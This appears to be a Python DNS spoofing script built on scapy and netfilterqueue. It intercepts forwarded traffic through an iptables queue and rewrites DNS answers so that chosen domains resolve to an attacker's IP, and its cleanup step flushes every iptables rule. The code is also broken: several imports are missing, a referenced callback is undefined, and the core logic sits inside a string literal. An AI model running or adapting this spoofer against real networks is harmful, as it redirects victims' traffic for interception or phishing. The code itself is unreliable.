from scapy.sendrecv import Packet

from objects.interfaces import Interface
from utils.output import print_text


class Spoofer:

    def __init__(self, name: str, interface: Interface) -> None:
        self._interface = interface

    def __handle_DNS_packet(self, packet: Packet):
        
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            
            print_text("[Before]:", scapy_packet.summary())
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            print("[After ]:", scapy_packet.summary())
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
        # accept the packet
        packet.accept()

'''
def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
'''